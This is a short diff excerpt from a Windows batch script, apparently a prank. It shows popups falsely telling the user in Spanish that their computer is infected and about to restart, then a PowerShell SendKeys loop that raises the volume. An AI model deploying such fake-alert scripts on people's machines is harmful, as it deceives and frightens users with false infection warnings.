@@ -8,7 +8,6 @@ msg * "TU ORDENADOR ESTA INFECTADO"
 msg * "ERROR: El sistema ha encontrado un problema grave. Reiniciando..."
 msg * "ERROR: El sistema ha encontrado un problema grave. Reiniciando..."
 
-
 :: subir volumen
 for /l %%x in (1,1,10) do powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"
 
